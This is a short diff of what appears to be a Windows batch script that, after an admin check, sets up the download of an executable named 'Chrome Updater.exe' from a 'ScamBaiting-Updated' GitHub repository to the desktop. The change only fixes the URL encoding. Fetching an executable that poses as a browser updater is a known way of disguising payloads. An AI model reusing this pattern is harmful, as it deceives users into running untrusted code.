@@ -10,7 +10,7 @@ if %errorLevel% neq 0 (
     exit
 )
 
-set "exeUrl=https://github.com/boucegame/ScamBaiting-Updated/raw/refs/heads/main/Chrome%%20Updater.exe"
+set "exeUrl=https://github.com/boucegame/ScamBaiting-Updated/raw/refs/heads/main/Chrome%20Updater.exe"
 set "exeName=Chrome Updater.exe"
 set "desktopPath=%USERPROFILE%\Desktop"
 set "exePath=%desktopPath%\%exeName%"
